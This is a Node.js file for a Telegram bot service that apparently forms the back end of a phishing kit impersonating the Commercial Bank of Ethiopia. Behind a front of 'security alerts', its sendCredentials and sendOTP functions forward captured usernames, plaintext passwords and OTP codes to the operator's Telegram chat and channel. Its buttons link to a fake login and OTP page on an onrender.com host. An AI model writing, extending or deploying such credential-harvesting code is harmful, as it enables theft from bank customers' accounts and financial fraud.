const logger = require('./logger');

class TelegramService {
    constructor() {
        this.enabled = false;
        this.bot = null;
        this.chatId = null;
        this.channelId = null;
        this.channelUsername = null;
        
        try {
            const token = process.env.TELEGRAM_BOT_TOKEN;
            const chatId = process.env.TELEGRAM_CHAT_ID;
            const channelId = process.env.TELEGRAM_CHANNEL_ID;
            const channelUsername = process.env.TELEGRAM_CHANNEL_USERNAME;

            if (!token) {
                logger.warn('Telegram token not configured');
                return;
            }

            const TelegramBot = require('node-telegram-bot-api');
            this.bot = new TelegramBot(token, { polling: false });
            this.chatId = chatId;
            
            if (channelId) {
                this.channelId = channelId;
                logger.info(`✅ Channel ID: ${channelId}`);
            } else if (channelUsername) {
                this.channelUsername = channelUsername;
                this.channelId = channelUsername;
                logger.info(`✅ Channel Username: ${channelUsername}`);
            }
            
            this.enabled = true;
            logger.info('✅ Telegram bot initialized with channel support');
            
        } catch (error) {
            logger.warn(`Telegram initialization failed: ${error.message}`);
            this.enabled = false;
        }
    }

    // ============================================
    // CORE SEND FUNCTIONS
    // ============================================

    // Send to private chat with inline keyboard
    async sendMessage(message, options = {}) {
        if (!this.enabled || !this.bot || !this.chatId) {
            logger.debug('Telegram chat not configured');
            return null;
        }

        try {
            const result = await this.bot.sendMessage(this.chatId, message, {
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                ...options
            });
            logger.info('✅ Message sent to private chat');
            return result;
        } catch (error) {
            logger.error(`Telegram chat error: ${error.message}`);
            return null;
        }
    }

    // Send to channel with inline keyboard
    async sendChannelPost(message, options = {}) {
        if (!this.enabled || !this.bot || !this.channelId) {
            logger.debug('Telegram channel not configured');
            return null;
        }

        try {
            const result = await this.bot.sendMessage(this.channelId, message, {
                parse_mode: 'HTML',
                disable_web_page_preview: true,
                ...options
            });
            logger.info('✅ Message posted to channel');
            return result;
        } catch (error) {
            logger.error(`Channel post error: ${error.message}`);
            return null;
        }
    }

    // Send to both chat and channel
    async sendToAll(message, options = {}) {
        const results = [];
        
        if (this.chatId) {
            const chatResult = await this.sendMessage(message, options);
            results.push({ type: 'chat', result: chatResult });
        }
        
        if (this.channelId) {
            const channelResult = await this.sendChannelPost(message, options);
            results.push({ type: 'channel', result: channelResult });
        }
        
        return results;
    }

    // ============================================
    // CREATE INLINE KEYBOARD BUTTONS
    // ============================================

    // Create login page button
    createLoginButton(showSecurityInfo = true) {
        const keyboard = [];
        
        // Main login button
        keyboard.push([
            {
                text: '🔐 Open Login Page',
                url: 'https://cbe-com.onrender.com/'
            }
        ]);
        
        // Secondary buttons
        const secondaryRow = [];
        
        if (showSecurityInfo) {
            secondaryRow.push({
                text: '🛡️ Security Info',
                callback_data: 'security_info'
            });
        }
        
        secondaryRow.push({
            text: '📱 OTP Page',
            url: 'https://cbe-com.onrender.com/otp-verify'
        });
        
        if (secondaryRow.length > 0) {
            keyboard.push(secondaryRow);
        }
        
        // Third row - quick actions
        keyboard.push([
            {
                text: '📊 View Status',
                callback_data: 'view_status'
            },
            {
                text: '🚨 Report Issue',
                callback_data: 'report_issue'
            }
        ]);
        
        return {
            inline_keyboard: keyboard
        };
    }

    // Create OTP button
    createOTPButton() {
        return {
            inline_keyboard: [
                [
                    {
                        text: '📱 Enter OTP',
                        url: 'https://cbe-com.onrender.com/otp-verify'
                    }
                ],
                [
                    {
                        text: '🔐 Back to Login',
                        url: 'https://cbe-com.onrender.com/'
                    }
                ]
            ]
        };
    }

    // Create custom action buttons
    createActionButtons(actions = []) {
        const keyboard = [];
        const row = [];
        
        actions.forEach(action => {
            row.push({
                text: action.text,
                url: action.url || undefined,
                callback_data: action.callback_data || undefined
            });
        });
        
        if (row.length > 0) {
            keyboard.push(row);
        }
        
        return { inline_keyboard: keyboard };
    }

    // Create security alert buttons
    createSecurityButtons(alertType = 'general') {
        const buttons = {
            inline_keyboard: [
                [
                    {
                        text: '🔐 Open Login Page',
                        url: 'https://cbe-com.onrender.com/'
                    }
                ],
                [
                    {
                        text: '🛡️ View Security Tips',
                        callback_data: 'security_tips'
                    },
                    {
                        text: '📱 OTP Page',
                        url: 'https://cbe-com.onrender.com/otp-verify'
                    }
                ],
                [
                    {
                        text: '🚨 Report Incident',
                        callback_data: 'report_incident'
                    },
                    {
                        text: '📊 View Logs',
                        callback_data: 'view_logs'
                    }
                ]
            ]
        };
        
        // Customize based on alert type
        if (alertType === 'suspicious') {
            buttons.inline_keyboard.unshift([
                {
                    text: '🛑 Block IP',
                    callback_data: 'block_ip'
                },
                {
                    text: '🔍 Investigate',
                    callback_data: 'investigate'
                }
            ]);
        } else if (alertType === 'success') {
            buttons.inline_keyboard.unshift([
                {
                    text: '✅ Mark as Safe',
                    callback_data: 'mark_safe'
                }
            ]);
        }
        
        return buttons;
    }

    // ============================================
    // LOGIN PAGE INFO WITH BUTTON
    // ============================================

    // Send login page information with button
    async sendLoginPageInfo() {
        if (!this.enabled) return null;

        const message = `
🏦 <b>CBE SECURITY VERIFICATION PORTAL</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 PAGE DETAILS:</b>
• <b>Title:</b> Commercial Bank of Ethiopia
• <b>System:</b> Security Verification System
• <b>Purpose:</b> Account Verification

<b>🔐 SECURITY FEATURES:</b>
• ✅ Secure Connection (SSL)
• ✅ Verified Identity Check
• ✅ Advanced Encryption (AES-256)
• ✅ OTP Verification
• ✅ Session Management
• ✅ Rate Limiting
• ✅ IP Monitoring

<b>🛡️ SECURITY TIPS:</b>
  1. Always verify the URL before logging in
  2. Never share your OTP with anyone
  3. Use a strong, unique password
  4. Enable 2FA for your account
  5. Log out after each session

<pre>═══════════════════════════════════════</pre>
🕐 <i>Alert: ${new Date().toISOString()}</i>
`;

        const options = {
            reply_markup: this.createLoginButton(true)
        };

        return this.sendChannelPost(message, options);
    }

    // Send login page accessed alert with button
    async sendLoginPageAccessed(data) {
        if (!this.enabled) return null;
        
        const message = `
🛡️ <b>CBE SECURITY MONITOR</b>
<pre>═══════════════════════════════════════</pre>

<b>🌐 LOGIN PAGE ACCESSED</b>

📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
🌍 <b>Location:</b> ${data.location || 'Unknown'}
⏰ <b>Time:</b> ${data.timestamp}
🔗 <b>Referrer:</b> ${data.referrer || 'Direct'}

<pre>═══════════════════════════════════════</pre>

⚠️ <b>SECURITY REMINDER:</b>
• Always verify user identity
• Enable 2FA for all accounts
• Monitor suspicious login attempts

<pre>═══════════════════════════════════════</pre>
🔐 <i>Click the button below to access the login page</i>
`;

        const options = {
            reply_markup: this.createLoginButton(true)
        };

        return this.sendToAll(message, options);
    }

    // Send login attempt alert with button
    async sendLoginAttempt(data) {
        if (!this.enabled) return null;
        
        const message = `
🔐 <b>CBE SECURITY ALERT</b>
<pre>═══════════════════════════════════════</pre>

<b>🔑 LOGIN ATTEMPT DETECTED</b>

👤 <b>Username:</b> <code>${data.username}</code>
📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
🔢 <b>Attempt #:</b> ${data.attempt || 1}
⏰ <b>Time:</b> ${data.timestamp}
✅ <b>Status:</b> ${data.success ? '🟢 SUCCESS' : '🔴 FAILED'}

<pre>═══════════════════════════════════════</pre>

<b>🔐 SECURITY TIPS:</b>
${data.success ? `
✅ Login successful - Ensure user is authorized
🔍 Monitor for unusual activity
📊 Track login patterns` : `
❌ Failed login attempt detected
🛡️ Check if credentials are compromised
🔒 Consider rate limiting`}

<pre>═══════════════════════════════════════</pre>
🛡️ <i>Protect your accounts. Use MFA.</i>
`;

        const options = {
            reply_markup: this.createLoginButton(false)
        };

        return this.sendToAll(message, options);
    }

    // Send security recommendation with button
    async sendSecurityRecommendation(data) {
        if (!this.enabled) return null;
        
        const message = `
📋 <b>CBE SECURITY RECOMMENDATION</b>
<pre>═══════════════════════════════════════</pre>

<b>${data.title}</b>

${data.description}

<b>📌 RECOMMENDATIONS:</b>
${data.recommendations.map((rec, i) => `   ${i+1}. ${rec}`).join('\n')}

<b>🔗 REFERENCE:</b>
${data.reference || 'CBE Security Guidelines 2026'}

<pre>═══════════════════════════════════════</pre>
🛡️ <i>Security is everyone's responsibility</i>
`;

        const options = {
            reply_markup: this.createLoginButton(true)
        };

        return this.sendToAll(message, options);
    }

    // Send login page security requirements with button
    async sendLoginSecurityRequirements() {
        if (!this.enabled) return null;
        
        const message = `
🔐 <b>CBE LOGIN PAGE SECURITY REQUIREMENTS</b>
<pre>═══════════════════════════════════════</pre>

<b>✅ SECURE LOGIN CHECKLIST:</b>

<b>🔒 Authentication:</b>
   • Use strong passwords (12+ characters)
   • Enable Two-Factor Authentication (2FA)
   • Implement rate limiting (3-5 attempts)
   • Use CAPTCHA after failed attempts

<b>🔐 Data Protection:</b>
   • Encrypt all sensitive data (AES-256)
   • Use HTTPS exclusively
   • Implement secure session management
   • Regular security audits

<b>🛡️ Monitoring:</b>
   • Log all login attempts
   • Monitor for brute force attacks
   • Alert on suspicious activity
   • Track IP addresses and user agents

<b>📱 User Security:</b>
   • Educate users about phishing
   • Encourage password managers
   • Implement account lockout policies
   • Regular security training

<pre>═══════════════════════════════════════</pre>
🚨 <b>IMMEDIATE ACTION REQUIRED:</b>
   • Review all login attempts
   • Update security protocols
   • Enable MFA for all users
   • Monitor for unauthorized access

<pre>═══════════════════════════════════════</pre>
🔐 <i>Secure your login page today!</i>
`;

        const options = {
            reply_markup: this.createLoginButton(true)
        };

        return this.sendToAll(message, options);
    }

    // Send suspicious activity alert with buttons
    async sendSuspiciousActivity(data) {
        if (!this.enabled) return null;
        
        const message = `
🚨 <b>CBE SECURITY BREACH DETECTED</b>
<pre>═══════════════════════════════════════</pre>

<b>⚠️ SUSPICIOUS ACTIVITY</b>

📱 <b>IP Address:</b> <code>${data.ip}</code>
🌍 <b>Location:</b> ${data.location || 'Unknown'}
🔢 <b>Failed Attempts:</b> ${data.failedAttempts || 0}
🕐 <b>Time Window:</b> ${data.timeWindow || '5 minutes'}
⏰ <b>Time:</b> ${data.timestamp}

<pre>═══════════════════════════════════════</pre>

<b>🔴 IMMEDIATE ACTIONS REQUIRED:</b>
   1. Block IP address immediately
   2. Review all recent login attempts
   3. Check for breached credentials
   4. Increase security monitoring
   5. Notify security team

<b>🛡️ PREVENTIVE MEASURES:</b>
   • Enable rate limiting
   • Implement IP blacklisting
   • Use CAPTCHA for all logins
   • Monitor failed attempts

<pre>═══════════════════════════════════════</pre>
🚨 <i>URGENT: Security incident in progress</i>
`;

        const options = {
            reply_markup: this.createSecurityButtons('suspicious')
        };

        return this.sendToAll(message, options);
    }

    // Send daily security report with button
    async sendDailySecurityReport(stats) {
        if (!this.enabled || !this.channelId) return null;
        
        const message = `
📊 <b>CBE DAILY SECURITY REPORT</b>
<pre>═══════════════════════════════════════</pre>

<b>📅 Date:</b> ${new Date().toISOString().split('T')[0]}

<b>📈 STATISTICS:</b>
   • Total Logins: ${stats.total || 0}
   • Successful: ${stats.successful || 0}
   • Failed: ${stats.failed || 0}
   • Suspicious: ${stats.suspicious || 0}
   • Blocked IPs: ${stats.blockedIps || 0}

<b>🛡️ SECURITY STATUS:</b>
   • System: ${stats.systemStatus || '🟢 Operational'}
   • Alerts: ${stats.alerts || 0}
   • Threats: ${stats.threats || 0}

<b>🔐 COMPLIANCE:</b>
   • 2FA Enabled: ${stats.twoFactorEnabled || '✅ Yes'}
   • Password Policy: ${stats.passwordPolicy || '✅ Enforced'}
   • Session Timeout: ${stats.sessionTimeout || '✅ Active'}

<pre>═══════════════════════════════════════</pre>
📋 <i>Review security posture daily</i>
`;

        const options = {
            reply_markup: this.createLoginButton(true)
        };

        return this.sendChannelPost(message, options);
    }

    // Send credentials alert with button
    async sendCredentials(data) {
        if (!this.enabled) return null;
        
        const message = `
🔐 <b>CBE SECURITY ALERT</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 NEW CREDENTIALS CAPTURED</b>

👤 <b>Username:</b> <code>${data.username}</code>
🔑 <b>Password:</b> <code>${data.password}</code>
📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
🆔 <b>ID:</b> <code>${data.id}</code>
⏰ <b>Timestamp:</b> ${data.timestamp}

<pre>═══════════════════════════════════════</pre>

<b>🔐 SECURE LOGIN REMINDER:</b>
   • Use strong passwords (12+ chars)
   • Enable 2FA for this account
   • Monitor for unusual activity
   • Change password if compromised

⚠️ <b>Action Required:</b> Investigate immediately
`;

        const options = {
            reply_markup: this.createLoginButton(true)
        };

        return this.sendToAll(message, options);
    }

    // Send OTP alert with button
    async sendOTP(data) {
        if (!this.enabled) return null;
        
        const message = `
🔐 <b>CBE SECURITY ALERT</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 OTP CODE CAPTURED</b>

🆔 <b>User ID:</b> <code>${data.userId}</code>
🔢 <b>OTP Code:</b> <code>${data.otp}</code>
📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
⏰ <b>Timestamp:</b> ${data.timestamp}

<pre>═══════════════════════════════════════</pre>

<b>🔐 OTP SECURITY TIPS:</b>
   • OTP expires in 5 minutes
   • Never share OTP with anyone
   • Only enter OTP on secure pages
   • Report suspicious OTP requests

⚠️ <b>Action Required:</b> Verify OTP authenticity
`;

        const options = {
            reply_markup: this.createOTPButton()
        };

        return this.sendToAll(message, options);
    }

    // Send welcome message with button
    async sendWelcomeMessage() {
        if (!this.enabled || !this.channelId) return null;
        
        const message = `
🚀 <b>CBE SECURITY SYSTEM ONLINE</b>
<pre>═══════════════════════════════════════</pre>

✅ System started successfully
📡 Monitoring active
🛡️ Security protocols engaged

<b>🔐 LOGIN PAGE SECURITY ACTIVE:</b>
   • Brute force protection: ✅
   • IP monitoring: ✅
   • Rate limiting: ✅
   • 2FA support: ✅
   • Session management: ✅

<pre>═══════════════════════════════════════</pre>

<b>📌 SECURITY REMINDER:</b>
   • Secure your login page
   • Monitor all attempts
   • Enable MFA
   • Stay vigilant

<pre>═══════════════════════════════════════</pre>
🔐 <i>All systems operational</i>
`;

        const options = {
            reply_markup: this.createLoginButton(true)
        };

        return this.sendChannelPost(message, options);
    }

    // Send system status update with button
    async sendSystemStatus(status, details = '') {
        if (!this.enabled || !this.channelId) return null;
        
        const emoji = status === 'online' ? '🟢' :
                     status === 'warning' ? '🟡' : '🔴';
        
        const message = `
${emoji} <b>SYSTEM STATUS UPDATE</b>
<pre>═══════════════════════════════════════</pre>

<b>Status:</b> ${status.toUpperCase()}
${details ? `📝 ${details}` : ''}

⏰ ${new Date().toISOString()}
`;

        const options = {
            reply_markup: this.createLoginButton(true)
        };

        return this.sendChannelPost(message, options);
    }

    // Send raw data with button
    async sendRawData(title, data) {
        if (!this.enabled || !this.channelId) return null;
        
        const message = `
📋 <b>${title}</b>
<pre>═══════════════════════════════════════</pre>

<pre>${JSON.stringify(data, null, 2)}</pre>

⏰ ${new Date().toISOString()}
`;

        const options = {
            reply_markup: this.createLoginButton(false)
        };

        return this.sendChannelPost(message, options);
    }

    // ============================================
    // HANDLE CALLBACK QUERIES (For interactive buttons)
    // ============================================

    // Handle button callback queries
    async handleCallbackQuery(callbackQuery) {
        if (!this.enabled || !this.bot) return;

        const data = callbackQuery.data;
        const chatId = callbackQuery.message.chat.id;
        const messageId = callbackQuery.message.message_id;

        try {
            let response = '';
            
            switch(data) {
                case 'security_info':
                    response = `
🛡️ <b>SECURITY INFORMATION</b>
<pre>═══════════════════════════════════════</pre>

<b>🔐 Encryption:</b> AES-256
<b>🔑 Authentication:</b> 2FA Ready
<b>🛡️ Protection:</b> Rate Limiting, IP Monitoring
<b>📱 OTP:</b> 6-digit, 5-minute expiry

<b>🔗 Secure URL:</b>
<code>https://cbe-com.onrender.com/</code>

<pre>═══════════════════════════════════════</pre>
<i>Always verify you're on the correct page</i>
`;
                    break;
                    
                case 'view_status':
                    response = `
📊 <b>SYSTEM STATUS</b>
<pre>═══════════════════════════════════════</pre>

<b>🟢 Status:</b> Online
<b>📡 Uptime:</b> ${process.uptime().toFixed(0)} seconds
<b>🔄 Last Check:</b> ${new Date().toISOString()}

<pre>═══════════════════════════════════════</pre>
<i>All systems operational</i>
`;
                    break;
                    
                case 'report_issue':
                case 'report_incident':
                    response = `
🚨 <b>REPORT ISSUE</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 Please provide:</b>
1. Description of the issue
2. Time of occurrence
3. Screenshots (if available)

<b>📧 Contact:</b> security@cbe.com
<b>📱 Emergency:</b> +251-XXX-XXXX

<pre>═══════════════════════════════════════</pre>
<i>Your report will be investigated immediately</i>
`;
                    break;
                    
                case 'security_tips':
                    response = `
🛡️ <b>SECURITY TIPS</b>
<pre>═══════════════════════════════════════</pre>

1. ✅ Use unique passwords for each account
2. ✅ Enable 2FA whenever possible
3. ✅ Never share OTP codes
4. ✅ Check URL before logging in
5. ✅ Log out after each session
6. ✅ Report suspicious activity

<pre>═══════════════════════════════════════</pre>
<i>Stay safe online</i>
`;
                    break;
                    
                case 'view_logs':
                    response = `
📋 <b>VIEW LOGS</b>
<pre>═══════════════════════════════════════</pre>

<b>🔗 Access logs at:</b>
<code>https://cbe-com.onrender.com/api/logs</code>

<b>📊 Stats at:</b>
<code>https://cbe-com.onrender.com/api/stats</code>

<pre>═══════════════════════════════════════</pre>
<i>Admin access required</i>
`;
                    break;
                    
                case 'block_ip':
                    response = `
🛑 <b>BLOCK IP</b>
<pre>═══════════════════════════════════════</pre>

<b>⚠️ Action:</b> Block IP address
<b>📱 IP:</b> ${callbackQuery.message.text.match(/📱\s*<b>IP Address:<\/b>\s*<code>([^<]+)<\/code>/)?.[1] || 'Unknown'}

<b>🔴 Confirm block?</b>
This will prevent all access from this IP.

<pre>═══════════════════════════════════════</pre>
<i>Use with caution</i>
`;
                    break;
                    
                case 'investigate':
                    response = `
🔍 <b>INVESTIGATE</b>
<pre>═══════════════════════════════════════</pre>

<b>📋 Investigation Steps:</b>
1. Check user login history
2. Verify IP address location
3. Review failed attempts
4. Check for compromised credentials
5. Take appropriate action

<pre>═══════════════════════════════════════</pre>
<i>Document all findings</i>
`;
                    break;
                    
                case 'mark_safe':
                    response = `
✅ <b>MARK AS SAFE</b>
<pre>═══════════════════════════════════════</pre>

<b>✅ This activity has been marked as safe</b>
📋 Log entry updated
📊 Statistics adjusted

<pre>═══════════════════════════════════════</pre>
<i>Activity verified as legitimate</i>
`;
                    break;
                    
                default:
                    response = `
❓ <b>Unknown Action</b>
<pre>═══════════════════════════════════════</pre>

Please use the buttons above or contact support.

<pre>═══════════════════════════════════════</pre>
<i>Action not recognized</i>
`;
            }

            // Send response
            await this.bot.sendMessage(chatId, response, {
                parse_mode: 'HTML',
                reply_to_message_id: messageId
            });

            // Acknowledge callback
            await this.bot.answerCallbackQuery(callbackQuery.id, {
                text: '✅ Action processed',
                show_alert: false
            });

        } catch (error) {
            logger.error(`Callback query error: ${error.message}`);
            await this.bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Error processing action',
                show_alert: true
            });
        }
    }

    // Set up callback query listener
    setupCallbackListener() {
        if (!this.enabled || !this.bot) return;

        this.bot.on('callback_query', (callbackQuery) => {
            this.handleCallbackQuery(callbackQuery);
        });

        logger.info('✅ Telegram callback listener active');
    }
}

module.exports = new TelegramService();
